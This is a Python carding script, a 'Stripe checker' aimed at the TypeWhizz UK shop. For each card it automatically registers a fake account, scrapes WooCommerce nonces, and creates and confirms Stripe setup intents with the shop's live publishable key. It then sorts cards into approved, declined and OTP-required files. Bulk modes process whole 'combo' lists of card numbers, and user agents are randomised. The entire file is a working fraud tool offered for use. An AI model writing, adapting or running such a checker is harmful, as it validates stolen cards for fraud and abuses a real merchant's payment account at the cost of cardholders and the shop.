#!/usr/bin/env python3
"""
TypeWhizz Stripe Checker v2 - Auto-Register (Fixed Nonce)
Dev: @sudo_3 | TEAM SCR
"""

import sys
import io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

import requests
import re
import json
import time
import random
import uuid
import os
from datetime import datetime
from fake_useragent import UserAgent

# ============================================================
#                     CONFIGURATION
# ============================================================
BASE_URL = "https://www.typewhizz.co.uk"
STRIPE_API = "https://api.stripe.com/v1"
DEV_NAME = "@sudo_3"
TEAM_NAME = "TEAM SCR"
DELAY = 4
# ============================================================

class TypeWhizzStripeChecker:
    def __init__(self):
        self.reset_session()
        self.ua = UserAgent()
        self.stripe_pk = "pk_live_51Hs4kRIi2SclCFeye67lXCzOCR8xHQCTwSfZ0tWQhYD3t99a4SBx2BA6VUK30m73zjp3KnoBMmbb6zVB5uzVO8YN00KsxjkZB7"
        self.stripe_acct = "acct_1Hs4kRIi2SclCFey"
        self.register_nonce = None
        self.add_nonce = None
        self.guid = "a476acea-d58c-4f2c-9e6d-8ea49c13cfe4ab84ea"
        self.muid = None
        self.sid = None
        self.account_created = False
        
        self.stop_flag = False
        self.results = []
        self.stats = {'approved': 0, 'declined': 0, 'otp': 0, 'errors': 0, 'total': 0}
    
    def reset_session(self):
        """إعادة تهيئة الجلسة (مسح الكوكيز وبدء جديد)"""
        self.session = requests.Session()
        self.cookies = {}
        self.account_created = False
        self.register_nonce = None
        self.add_nonce = None
        self.muid = None
        self.sid = None
        
    def _ua(self):
        return self.ua.random
    
    def _delay(self, msg="", seconds=DELAY):
        if msg:
            print(f"[*] {msg}...")
        time.sleep(seconds)
    
    # ---------- 1. تهيئة الجلسة ----------
    def init_session(self):
        for attempt in range(1, 4):
            try:
                headers = {
                    'authority': 'www.typewhizz.co.uk',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'user-agent': self._ua(),
                }
                response = self.session.get(BASE_URL, headers=headers, timeout=15)
                self.cookies.update(self.session.cookies.get_dict())
                print("[+] Session initialized")
                return True
            except Exception as e:
                print(f"[-] Init session attempt {attempt}/3 error: {e}")
                if attempt < 3:
                    time.sleep(2)
        return False
    
    # ---------- 2. استخراج Register Nonce ----------
    def get_register_nonce(self):
        for attempt in range(1, 4):
            try:
                headers = {
                    'authority': 'www.typewhizz.co.uk',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'user-agent': self._ua(),
                }
                response = self.session.get(f'{BASE_URL}/account-2/', headers=headers, timeout=15)
                self.cookies.update(self.session.cookies.get_dict())
                html = response.text
                
                nonce = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', html)
                if nonce:
                    self.register_nonce = nonce.group(1)
                    print(f"[+] Register nonce: {self.register_nonce}")
                    return True
                print("[!] Register nonce not found")
                return False
            except Exception as e:
                print(f"[-] Get register nonce attempt {attempt}/3 error: {e}")
                if attempt < 3:
                    time.sleep(2)
        return False
    
    # ---------- 3. تسجيل حساب جديد ----------
    def register_account(self):
        try:
            if not self.register_nonce:
                if not self.get_register_nonce():
                    return False
            
            username = f"user{random.randint(1000,9999)}"
            email = f"{username}@gmail.com"
            
            headers = {
                'authority': 'www.typewhizz.co.uk',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.typewhizz.co.uk',
                'referer': f'{BASE_URL}/account-2/',
                'user-agent': self._ua(),
            }
            
            data = {
                'email': email,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': 'https://www.typewhizz.co.uk/my-account/payment-methods/',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://www.typewhizz.co.uk/my-account/add-payment-method/',
                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '8',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self._ua(),
                'woocommerce-register-nonce': self.register_nonce,
                '_wp_http_referer': '/account-2/',
                'register': 'Register',
            }
            
            response = self.session.post(
                f'{BASE_URL}/account-2/',
                headers=headers,
                data=data,
                timeout=20
            )
            self.cookies.update(self.session.cookies.get_dict())
            
            if "logout" in response.text.lower() or "Dashboard" in response.text or "my-account" in response.url:
                print(f"[+] Registered: {email}")
                self.account_created = True
                return True
            return False
        except Exception as e:
            print(f"[-] Register error: {e}")
            return False
    
    # ---------- 4. جلب صفحة إضافة الدفع واستخراج nonce ----------
    def get_add_payment_page(self):
        try:
            headers = {
                'authority': 'www.typewhizz.co.uk',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'referer': f'{BASE_URL}/my-account/payment-methods/',
                'user-agent': self._ua(),
            }
            response = self.session.get(
                f'{BASE_URL}/my-account/add-payment-method/',
                headers=headers,
                timeout=15
            )
            self.cookies.update(self.session.cookies.get_dict())
            html = response.text
            
            # استخراج muid, sid من cookies
            self.muid = self.cookies.get('__stripe_mid', '1a90948f-8312-43b9-982e-b36292be8b7c768ce4')
            self.sid = self.cookies.get('__stripe_sid', '8270e0b7-f5de-420c-a72c-01688b33a09f1d805b')
            print(f"[+] MUID: {self.muid[:20]}...")
            print(f"[+] SID: {self.sid[:20]}...")
            
            # ===== استخراج x-wp-nonce (المهم) =====
            self.add_nonce = None
            
            # 1. من script يحتوي على "nonce"
            nonce_script = re.search(r'"nonce":"([^"]+)"', html)
            if nonce_script:
                self.add_nonce = nonce_script.group(1)
                print(f"[+] WP Nonce (script): {self.add_nonce}")
            
            # 2. من meta tag
            if not self.add_nonce:
                nonce_meta = re.search(r'<meta name="x-wp-nonce"[^>]*content="([^"]+)"', html)
                if nonce_meta:
                    self.add_nonce = nonce_meta.group(1)
                    print(f"[+] WP Nonce (meta): {self.add_nonce}")
            
            # 3. من أي script يحتوي على "rest_nonce"
            if not self.add_nonce:
                rest_nonce = re.search(r'"rest_nonce":"([^"]+)"', html)
                if rest_nonce:
                    self.add_nonce = rest_nonce.group(1)
                    print(f"[+] WP Nonce (rest): {self.add_nonce}")
            
            # 4. إذا لم نجد، نستخدم fallback من الريكويست الأصلي
            if not self.add_nonce:
                self.add_nonce = "f1cf1487c9"
                print(f"[!] Using fallback nonce: {self.add_nonce}")
            
            return True
        except Exception as e:
            print(f"[-] Get add payment page error: {e}")
            return False
    
    # ---------- 5. إنشاء Payment Method عبر Stripe ----------
    def create_payment_method(self, card_data):
        try:
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self._ua(),
            }
            
            number = card_data['number']
            month = card_data['month']
            year = card_data['year']
            cvc = card_data['cvv']
            
            client_session_id = str(uuid.uuid4())
            elements_session_id = f'elements_session_{uuid.uuid4().hex[:10]}'
            elements_config_id = str(uuid.uuid4())
            time_on_page = random.randint(10000, 99999)
            
            data = {
                'billing_details[name]': '+',
                'billing_details[email]': f'user{random.randint(100,999)}@gmail.com',
                'billing_details[address][country]': 'GB',
                'type': 'card',
                'card[number]': number,
                'card[cvc]': cvc,
                'card[exp_year]': year,
                'card[exp_month]': month,
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/9d9e6b8da8; stripe-js-v3/9d9e6b8da8; payment-element; deferred-intent',
                'referrer': 'https://www.typewhizz.co.uk',
                'time_on_page': str(time_on_page),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_id]': elements_session_id,
                'client_attribution_metadata[elements_session_config_id]': elements_config_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': self.guid,
                'muid': self.muid,
                'sid': self.sid,
                'key': self.stripe_pk,
                '_stripe_account': self.stripe_acct,
                '_stripe_version': '2025-09-30.clover',
            }
            
            response = requests.post(
                f'{STRIPE_API}/payment_methods',
                headers=headers,
                data=data,
                timeout=20
            )
            
            if response.status_code == 200:
                result = response.json()
                pm_id = result.get('id')
                if pm_id:
                    print(f"[+] PM created: {pm_id}")
                    return pm_id, None
                else:
                    error = result.get('error', {}).get('message', 'Unknown error')
                    if 'declined' in error.lower():
                        return 'DECLINED', error
                    return None, error
            else:
                return None, f"HTTP {response.status_code} - {response.text[:100]}"
        except Exception as e:
            return None, str(e)
    
    # ---------- 6. إنشاء Setup Intent (عبر WooCommerce) ----------
    def create_setup_intent(self, pm_id):
        try:
            if not self.add_nonce:
                print("[!] No WP nonce - using fallback")
                self.add_nonce = "f1cf1487c9"
            
            headers = {
                'authority': 'www.typewhizz.co.uk',
                'accept': 'application/json, */*;q=0.1',
                'content-type': 'application/json',
                'origin': 'https://www.typewhizz.co.uk',
                'referer': f'{BASE_URL}/my-account/add-payment-method/',
                'user-agent': self._ua(),
                'x-wp-nonce': self.add_nonce,
            }
            params = {
                'wc-ajax': 'wc_stripe_frontend_request',
                'path': '/wc-stripe/v1/setup-intent',
                '_locale': 'user',
            }
            json_data = {
                'payment_method': 'stripe_cc',
                'context': 'add_payment_method',
                'payment_method_id': pm_id,
            }
            
            response = self.session.post(
                f'{BASE_URL}/',
                params=params,
                headers=headers,
                json=json_data,
                timeout=20
            )
            self.cookies.update(self.session.cookies.get_dict())
            
            if response.status_code == 200:
                result = response.json()
                if 'client_secret' in result:
                    print(f"[+] Setup intent created: {result.get('id', '')[:20]}...")
                    return result['client_secret'], None
                elif 'id' in result and 'client_secret' in result:
                    print(f"[+] Setup intent created: {result['id'][:20]}...")
                    return result['client_secret'], None
                else:
                    return None, f"Unexpected response: {json.dumps(result)[:100]}"
            else:
                print(f"[!] Setup intent error: {response.status_code}")
                print(f"[!] Response: {response.text[:200]}")
                # محاولة أخرى مع nonce مختلف (من cookies)
                if response.status_code == 403:
                    # إعادة جلب الصفحة للحصول على nonce جديد
                    print("[*] Re-fetching add-payment page for new nonce...")
                    if self.get_add_payment_page():
                        headers['x-wp-nonce'] = self.add_nonce
                        response2 = self.session.post(
                            f'{BASE_URL}/',
                            params=params,
                            headers=headers,
                            json=json_data,
                            timeout=20
                        )
                        if response2.status_code == 200:
                            result = response2.json()
                            if 'client_secret' in result:
                                return result['client_secret'], None
                return None, f"HTTP {response.status_code} - {response.text[:100]}"
        except Exception as e:
            return None, str(e)
    
    # ---------- 7. تأكيد Setup Intent (عبر Stripe) ----------
    def confirm_setup_intent(self, client_secret, pm_id):
        try:
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self._ua(),
            }
            
            setup_intent_id = client_secret.split('_secret_')[0]
            
            data = {
                'use_stripe_sdk': 'true',
                'mandate_data[customer_acceptance][type]': 'online',
                'mandate_data[customer_acceptance][online][ip_address]': '197.47.232.33',
                'mandate_data[customer_acceptance][online][user_agent]': self._ua(),
                'return_url': f'{BASE_URL}/wc-api/stripe_add_payment_method/?nonce=aff5e7bd4f&payment_method=stripe_cc&context=add_payment_method',
                'key': self.stripe_pk,
                '_stripe_account': self.stripe_acct,
                '_stripe_version': '2025-09-30.clover',
                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': 'l1',
                'client_secret': client_secret,
            }
            
            response = requests.post(
                f'{STRIPE_API}/setup_intents/{setup_intent_id}/confirm',
                headers=headers,
                data=data,
                timeout=20
            )
            
            if response.status_code == 200:
                result = response.json()
                status = result.get('status')
                if status == 'succeeded':
                    return 'APPROVED', 'Payment method added successfully'
                elif status in ('requires_action', 'requires_confirmation'):
                    return 'OTP_REQUIRED', '3DS authentication required'
                else:
                    return 'DECLINED', f'Status: {status}'
            else:
                error = response.json().get('error', {}).get('message', 'Unknown error')
                if 'declined' in error.lower():
                    return 'DECLINED', error
                return 'ERROR', error
        except Exception as e:
            return 'ERROR', str(e)
    
    # ---------- 8. الدالة الأساسية ----------
    def check_card(self, card_string):
        self.reset_session()
        start_time = time.time()
        
        try:
            card_data = self.format_card(card_string)
            if not card_data:
                return {
                    'card': card_string,
                    'status': 'ERROR',
                    'message': 'Invalid format (use: number|mm|yy|cvv)',
                    'time': 0
                }
            formatted = card_data['formatted']
            
            print(f"[*] Checking card: {formatted[:20]}...")
            
            # 1. تهيئة الجلسة
            print(f"[*] Initializing session...")
            if not self.init_session():
                return {'card': formatted, 'status': 'ERROR', 'message': 'Failed to init session', 'time': time.time()-start_time}
            self._delay("Session ready", 1)
            
            # 2. استخراج Register Nonce
            print(f"[*] Getting register nonce...")
            if not self.get_register_nonce():
                return {'card': formatted, 'status': 'ERROR', 'message': 'Failed to get register nonce', 'time': time.time()-start_time}
            self._delay("Nonce ready", 1)
            
            # 3. تسجيل حساب جديد
            print(f"[*] Registering account...")
            if not self.register_account():
                return {'card': formatted, 'status': 'ERROR', 'message': 'Failed to register account', 'time': time.time()-start_time}
            self._delay("Account ready", 2)
            
            # 4. جلب صفحة إضافة الدفع (للكوكيز والنونس)
            print(f"[*] Getting add payment page...")
            if not self.get_add_payment_page():
                return {'card': formatted, 'status': 'ERROR', 'message': 'Failed to get add payment page', 'time': time.time()-start_time}
            self._delay("Payment page ready", 1)
            
            # 5. إنشاء Payment Method
            print(f"[*] Creating payment method...")
            pm_id, error = self.create_payment_method(card_data)
            if not pm_id:
                if pm_id == 'DECLINED':
                    return {'card': formatted, 'status': 'DECLINED', 'message': error, 'time': time.time()-start_time}
                return {'card': formatted, 'status': 'ERROR', 'message': f'PM failed: {error[:80]}', 'time': time.time()-start_time}
            self._delay("PM created", 1)
            
            # 6. إنشاء Setup Intent
            print(f"[*] Creating setup intent...")
            client_secret, error = self.create_setup_intent(pm_id)
            if not client_secret:
                return {'card': formatted, 'status': 'ERROR', 'message': f'Setup intent failed: {error[:80]}', 'time': time.time()-start_time}
            self._delay("Setup intent ready", 1)
            
            # 7. تأكيد Setup Intent
            print(f"[*] Confirming setup intent...")
            status, message = self.confirm_setup_intent(client_secret, pm_id)
            
            elapsed = time.time() - start_time
            
            return {
                'card': formatted,
                'status': status,
                'message': message,
                'time': elapsed,
                'pm_id': pm_id
            }
            
        except Exception as e:
            return {
                'card': card_string,
                'status': 'ERROR',
                'message': str(e),
                'time': time.time() - start_time
            }
    
    # ---------- 9. تنسيق البطاقة ----------
    def format_card(self, card_string):
        card_string = card_string.strip()
        parts = re.split(r'[/|\-_\s]+', card_string)
        if len(parts) != 4:
            return None
        number = re.sub(r'\D', '', parts[0])
        month = parts[1].zfill(2)
        year = parts[2]
        cvv = parts[3].strip()
        if len(year) == 4:
            year = year[2:]
        return {
            'number': number,
            'month': month,
            'year': year,
            'cvv': cvv,
            'formatted': f"{number}|{month}|{year}|{cvv}"
        }
    
    # ---------- 10. عرض النتيجة ----------
    def display_result(self, result, card):
        print(f"┌{'─'*58}┐")
        time_taken = result.get('time', 0)
        print(f"│ ⏱ {time_taken:.2f}s")
        print(f"├{'─'*58}┤")
        status = result.get('status', 'UNKNOWN')
        icon = {'APPROVED':'✅','DECLINED':'❌','OTP_REQUIRED':'🔐','ERROR':'⚠️'}.get(status, '❓')
        print(f"│ {icon} STATUS: {status}")
        card_parts = card.split('|')
        card_num = card_parts[0] if len(card_parts) > 0 else card
        print(f"│ 💳 Card: {card_num[:4]}****{card_num[-4:]}")
        msg = result.get('message', '')
        if msg:
            print(f"│ 📝 Response: {msg[:60]}")
        if result.get('pm_id'):
            print(f"│ 🆔 PM ID: {result['pm_id']}")
        print(f"└{'─'*58}┘\n")
    
    # ---------- 11. معالجة القوائم ----------
    def process_cards(self, cards):
        if not cards:
            print("✗ No cards provided.")
            return
        
        self.stats = {'approved': 0, 'declined': 0, 'otp': 0, 'errors': 0, 'total': len(cards)}
        self.results = []
        self.stop_flag = False
        
        print(f"\n{'='*60}")
        print(f"📁 Processing {len(cards)} cards")
        print(f"🔄 Auto-Register for each card")
        print(f"⏳ Delay: {DELAY}s between cards")
        print(f"{'='*60}\n")
        
        for i, card in enumerate(cards, 1):
            if self.stop_flag:
                print(f"\n🛑 Stopped by user!")
                break
            
            print(f"┌{'─'*58}┐")
            print(f"│ [{i}/{len(cards)}] Checking: {card[:30]}...")
            result = self.check_card(card)
            self.results.append(result)
            
            if result['status'] == 'APPROVED':
                self.stats['approved'] += 1
                status_text = "✅ APPROVED"
                with open('approved.txt', 'a') as f:
                    f.write(f"{card} | {result['message']}\n")
            elif result['status'] == 'DECLINED':
                self.stats['declined'] += 1
                status_text = "❌ DECLINED"
                with open('declined.txt', 'a') as f:
                    f.write(f"{card} | {result['message']}\n")
            elif result['status'] == 'OTP_REQUIRED':
                self.stats['otp'] += 1
                status_text = "🔐 OTP REQUIRED"
                with open('otp.txt', 'a') as f:
                    f.write(f"{card} | {result['message']}\n")
            else:
                self.stats['errors'] += 1
                status_text = f"⚠️ {result['status']}"
                with open('errors.txt', 'a') as f:
                    f.write(f"{card} | {result['message']}\n")
            
            msg = result.get('message', '')[:50]
            print(f"│ {status_text} - {msg}")
            print(f"└{'─'*58}┘")
            print(f"📊 ✅ {self.stats['approved']} | ❌ {self.stats['declined']} | 🔐 {self.stats['otp']} | ⚠️ {self.stats['errors']} | 📦 {self.stats['total']}")
            
            if i < len(cards):
                self._delay("Waiting before next card", DELAY)
        
        self._display_results()
    
    def _display_results(self):
        print(f"\n\n{'='*60}")
        print(f"📊 SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"✅ Approved: {self.stats['approved']}")
        print(f"❌ Declined: {self.stats['declined']}")
        print(f"🔐 OTP Required: {self.stats.get('otp', 0)}")
        print(f"⚠️ Errors: {self.stats['errors']}")
        print(f"📦 Total: {self.stats['total']}")
        if self.stats['total'] > 0:
            rate = (self.stats['approved'] / self.stats['total']) * 100
            print(f"📈 Success Rate: {rate:.1f}%")
        print(f"{'='*60}")
        print(f"\n👨‍💻 Dev: {DEV_NAME} | {TEAM_NAME}")

# ============================================================
#                     MAIN
# ============================================================
def main():
    print("=" * 60)
    print("TypeWhizz Stripe Checker v2 - Auto-Register (Fixed Nonce)")
    print(f"Dev: {DEV_NAME} | {TEAM_NAME}")
    print(f"⏳ Delay: {DELAY}s between steps")
    print("🔄 Auto-Register: New account for each card")
    print("💳 Stripe Setup Intent Flow with dynamic nonce")
    print("=" * 60)
    
    checker = TypeWhizzStripeChecker()
    
    while True:
        print(f"\n{'='*60}")
        print(f"  1. Single Card Check")
        print(f"  2. Combo File Check")
        print(f"  3. Mass Paste (paste multiple cards)")
        print(f"  4. Exit")
        print(f"{'='*60}")
        
        try:
            choice = input(f"\n[+] Choose (1-4): ").strip()
            
            if choice == '1':
                print(f"\n{'='*60}")
                print(f"💳 SINGLE CARD CHECK")
                print(f"{'='*60}")
                print(f"Format: number|mm|yy|cvv")
                print(f"Example: 4769700688795135|06|29|885")
                
                card = input(f"\n[+] Enter Card: ").strip()
                if card.lower() == 'q':
                    continue
                if not card:
                    continue
                
                result = checker.check_card(card)
                checker.display_result(result, card)
                
                if result['status'] == 'APPROVED':
                    with open('approved.txt', 'a') as f:
                        f.write(f"{card} | {result['message']}\n")
                    print("✓ Saved to approved.txt")
                elif result['status'] == 'OTP_REQUIRED':
                    with open('otp.txt', 'a') as f:
                        f.write(f"{card} | {result['message']}\n")
                    print("✓ Saved to otp.txt")
            
            elif choice == '2':
                print(f"\n{'='*60}")
                print(f"📁 COMBO FILE CHECK")
                print(f"{'='*60}")
                
                file_path = input(f"[+] File path: ").strip()
                if not os.path.exists(file_path):
                    print(f"✗ File not found")
                    continue
                
                with open(file_path, 'r', encoding='utf-8') as f:
                    cards = [line.strip() for line in f if line.strip()]
                checker.process_cards(cards)
            
            elif choice == '3':
                print(f"\n📝 MASS PASTE")
                print("Enter cards (one per line). Press Enter twice to finish:")
                lines = []
                while True:
                    line = input()
                    if line == "":
                        break
                    lines.append(line)
                input_text = "\n".join(lines)
                if input_text.strip():
                    cards = [c.strip() for c in input_text.splitlines() if c.strip()]
                    checker.process_cards(cards)
                else:
                    print("✗ No cards entered.")
            
            elif choice == '4':
                print(f"\n👋 Bye!")
                print(f"\nDev: {DEV_NAME} | {TEAM_NAME}")
                break
            else:
                print(f"✗ Invalid choice")
                
        except KeyboardInterrupt:
            print(f"\n\n🛑 Interrupted")
            print(f"\nDev: {DEV_NAME} | {TEAM_NAME}")
            break
        except Exception as e:
            print(f"✗ Error: {str(e)}")

if __name__ == "__main__":
    main()